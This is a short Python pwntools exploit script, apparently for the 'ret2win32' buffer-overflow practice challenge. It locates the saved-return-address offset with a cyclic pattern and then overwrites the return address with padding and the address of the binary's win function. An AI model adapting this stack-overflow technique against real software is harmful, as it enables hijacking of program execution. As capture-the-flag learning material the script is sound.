#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './ret2win32'
e = context.binary = ELF(exe, checksec=False)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *main
c
'''
)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b"we're using read()!", payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_ip(cyclic(56))
win=e.symbols.ret2win
p.sendline(b"\x90"*44+p32(win))


p.interactive()